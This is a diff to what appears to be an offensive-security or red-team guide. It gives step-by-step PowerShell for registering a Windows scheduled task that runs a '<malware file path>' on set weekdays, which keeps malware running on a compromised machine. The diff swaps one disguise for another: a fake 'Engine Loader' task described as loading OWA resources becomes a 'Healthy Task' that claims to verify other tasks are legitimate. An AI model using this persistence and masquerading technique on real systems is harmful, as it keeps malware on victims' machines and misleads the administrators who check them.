@@ -11,14 +11,14 @@ sharpps SCHTASKS /CREATE /SC DAILY /TN "MyTasks\Notepad task" /TR "Path to the e
 
 1. Create a txt file named `schdTask.ps1`
 
-2. Paste in the powershell below.
+2. Paste in the powershell below and make edits as necessary.
 
 ```powershell
-$outpath = "D:\Exchange Server\FIP-FS\Bin\ScanEngineLoader.exe"
+$outpath = "<malware file path>"
 $action = New-ScheduledTaskAction -Execute $outpath
-$days = 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday'
-$trigger = New-ScheduledTaskTrigger -weekly -DaysOfWeek $days -At 9am
-Register-ScheduledTask -Action $action -Trigger $trigger -Taskname "Engine Loader" -Description "This task loads resouces for OWA."
+$days = 'Monday', 'Wednesday', 'Friday'
+$trigger = New-ScheduledTaskTrigger -weekly -DaysOfWeek $days -At 11am
+Register-ScheduledTask -Action $action -Trigger $trigger -Taskname "Healthy Task" -Description "This task verifies that all other scheduled tasks are legitimate processes."
 ```
 3. Run 'pslo \<schdTask.ps1 file path>' 
 
